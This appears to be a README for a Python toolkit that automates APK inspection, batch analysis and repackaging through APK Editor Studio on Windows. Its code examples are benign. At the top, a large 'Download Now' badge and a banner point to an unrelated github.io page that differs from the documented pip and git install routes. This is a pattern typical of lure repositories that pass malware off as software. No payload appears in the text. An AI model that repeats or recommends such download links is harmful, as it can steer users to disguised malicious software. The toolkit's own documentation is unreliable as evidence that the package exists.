# android-studio-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://MMartins100.github.io/android-zone-rbk/)


[![Banner](banner.png)](https://MMartins100.github.io/android-zone-rbk/)


[![PyPI version](https://badge.fury.io/py/android-studio-toolkit.svg)](https://badge.fury.io/py/android-studio-toolkit)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Build Status](https://img.shields.io/github/actions/workflow/status/android-studio-toolkit/android-studio-toolkit/ci.yml)](https://github.com/android-studio-toolkit/android-studio-toolkit)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

A Python toolkit for automating APK analysis, extraction, and workflow integration with **APK Editor Studio on Windows**. Designed for Android developers and security researchers who need programmatic control over APK processing pipelines.

APK Editor Studio is a well-regarded open-source tool for inspecting and editing Android application packages. This toolkit wraps its core capabilities into a clean Python API, enabling automated batch processing, CI/CD integration, and structured data extraction from APK files.

---

## Features

- 🔍 **APK Inspection** — Extract metadata, permissions, and manifest data from `.apk` files programmatically
- 📦 **Batch Processing** — Automate multi-file workflows across directories of APK packages
- 🛠️ **APK Editor Studio Integration** — Drive APK Editor Studio on Windows via subprocess with a clean Python interface
- 📊 **Structured Data Export** — Output analysis results as JSON, CSV, or SQLite for downstream tooling
- 🔄 **Resource Extraction** — Pull drawable assets, string resources, and compiled XML from APK archives
- 🧪 **Manifest Analysis** — Parse `AndroidManifest.xml` to audit permissions, activities, and intent filters
- 📁 **Signature Verification** — Inspect APK signing certificates and validation status
- 🔗 **CI/CD Ready** — Designed for integration with GitHub Actions, Jenkins, and other pipeline tools

---

## Requirements

| Requirement | Version |
|---|---|
| Python | 3.8 or higher |
| APK Editor Studio | Latest (Windows) |
| Java Runtime Environment | 8 or higher |
| Operating System | Windows 10/11, Linux, macOS |

### Python Dependencies

```
lxml>=4.9.0
click>=8.1.0
rich>=13.0.0
pydantic>=2.0.0
pandas>=2.0.0
```

---

## Installation

### From PyPI

```bash
pip install android-studio-toolkit
```

### From Source

```bash
git clone https://github.com/android-studio-toolkit/android-studio-toolkit.git
cd android-studio-toolkit
pip install -e ".[dev]"
```

### APK Editor Studio Setup (Windows)

The toolkit expects APK Editor Studio to be accessible on your system. Set the installation path via environment variable or config file:

```bash
# Windows
set APKEDITOR_PATH=C:\Program Files\APK Editor Studio\apkeditor.exe

# Or add to your .env file
APKEDITOR_PATH=C:\Program Files\APK Editor Studio\apkeditor.exe
```

---

## Quick Start

```python
from android_studio_toolkit import APKAnalyzer

# Point to an APK file
analyzer = APKAnalyzer("path/to/your/app.apk")

# Extract basic metadata
info = analyzer.get_info()
print(info)
# Output:
# {
#   "package_name": "com.example.myapp",
#   "version_name": "2.1.0",
#   "version_code": 210,
#   "min_sdk": 21,
#   "target_sdk": 33,
#   "permissions": ["android.permission.INTERNET", "android.permission.CAMERA"]
# }
```

---

## Usage Examples

### 1. Extracting APK Metadata

```python
from android_studio_toolkit import APKAnalyzer
from android_studio_toolkit.exporters import JSONExporter

analyzer = APKAnalyzer("com.example.app.apk")

# Get full manifest data
manifest = analyzer.get_manifest()
print(f"Package: {manifest.package_name}")
print(f"Target SDK: {manifest.target_sdk}")
print(f"Declared permissions: {len(manifest.permissions)}")

# Export to JSON
exporter = JSONExporter(output_dir="./output")
exporter.save(manifest, filename="manifest_report.json")
```

---

### 2. Batch Processing a Directory of APKs

```python
from pathlib import Path
from android_studio_toolkit import APKBatchProcessor
from android_studio_toolkit.exporters import CSVExporter

apk_directory = Path("./apks")
processor = APKBatchProcessor(source_dir=apk_directory)

results = processor.run(
    tasks=["metadata", "permissions", "signatures"],
    max_workers=4  # parallel processing
)

# Export all results to a single CSV
exporter = CSVExporter(output_dir="./reports")
exporter.save_batch(results, filename="batch_analysis.csv")

print(f"Processed {len(results)} APK files.")
```

---

### 3. Analyzing Permissions and Security Flags

```python
from android_studio_toolkit import APKAnalyzer
from android_studio_toolkit.security import PermissionAuditor

analyzer = APKAnalyzer("target_app.apk")
manifest = analyzer.get_manifest()

auditor = PermissionAuditor()
report = auditor.audit(manifest)

# Identify high-sensitivity permissions
for perm in report.high_sensitivity:
    print(f"[HIGH] {perm.name}: {perm.description}")

# Check for dangerous permission combinations
if report.has_dangerous_combinations:
    print("Warning: Dangerous permission combinations detected.")
    for combo in report.dangerous_combinations:
        print(f"  - {combo}")
```

---

### 4. Resource Extraction

```python
from android_studio_toolkit import APKAnalyzer

analyzer = APKAnalyzer("app_release.apk")

# Extract string resources
strings = analyzer.extract_strings(locale="en")
for key, value in strings.items():
    print(f"{key}: {value}")

# Extract drawable assets to a local folder
analyzer.extract_resources(
    resource_type="drawable",
    output_dir="./extracted_assets"
)

print("Resource extraction complete.")
```

---

### 5. Signature and Certificate Inspection

```python
from android_studio_toolkit import APKAnalyzer

analyzer = APKAnalyzer("signed_app.apk")
signature_info = analyzer.get_signature()

print(f"Signing scheme: {signature_info.scheme}")   # e.g., V2, V3
print(f"Issuer: {signature_info.issuer}")
print(f"Valid from: {signature_info.valid_from}")
print(f"Valid until: {signature_info.valid_until}")
print(f"SHA-256 fingerprint: {signature_info.fingerprint_sha256}")
```

---

### 6. APK Editor Studio Workflow Automation (Windows)

```python
from android_studio_toolkit.integrations import APKEditorStudioRunner

# Initialize with your APK Editor Studio installation path
runner = APKEditorStudioRunner(
    editor_path=r"C:\Program Files\APK Editor Studio\apkeditor.exe"
)

# Open a project, apply resource changes, and repackage
runner.open_project("original_app.apk")
runner.replace_resource(
    resource_path="res/values/strings.xml",
    replacement_file="./my_strings.xml"
)
result = runner.repackage(output_path="./modified_app.apk")

if result.success:
    print(f"Repackaged APK saved to: {result.output_path}")
else:
    print(f"Repackaging failed: {result.error_message}")
```

---

## CLI Usage

The toolkit also ships with a command-line interface:

```bash
# Analyze a single APK
android-toolkit analyze app.apk --output json

# Batch process a folder
android-toolkit batch ./apks/ --tasks permissions,metadata --workers 4 --export csv

# Inspect signatures
android-toolkit signatures signed_app.apk

# Extract string resources
android-toolkit extract-strings app.apk --locale en --output ./strings/
```

---

## Project Structure

```
android-studio-toolkit/
├── android_studio_toolkit/
│   ├── __init__.py
│   ├── analyzer.py          # Core APKAnalyzer class
│   ├── batch.py             # Batch processing engine
│   ├── manifest.py          # AndroidManifest.xml parser
│   ├── security/
│   │   ├── permissions.py   # Permission auditing
│   │   └── signatures.py    # Signature inspection
│   ├── exporters/
│   │   ├── json_exporter.py
│   │   └── csv_exporter.py
│   └── integrations/
│       └── apk_editor_studio.py  # APK Editor Studio bridge
├── tests/
├── docs/
├── pyproject.toml
└── README.md
```

---

## Contributing

Contributions are welcome and appreciated. To get started:

1. **Fork** the repository
2. **Create a feature branch** — `git checkout -b feature/your-feature-name`
3. **Write tests** for new functionality in the `tests/` directory
4. **Run the test suite** — `pytest tests/ --cov=android_studio_toolkit`
5. **Submit a pull request** with a clear description of your changes

Please follow the existing code style (`black` formatting, type hints, docstrings) and ensure all CI checks pass before requesting a review.

### Reporting Issues

Open an issue on GitHub with:
- Your Python version and OS
- A minimal reproducible example
- The full error traceback

---

## License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

This toolkit is an independent open-source project and is not officially affiliated with or endorsed by the APK Editor Studio project or its maintainers.

---

*Built for Android developers who prefer automation over manual workflows.*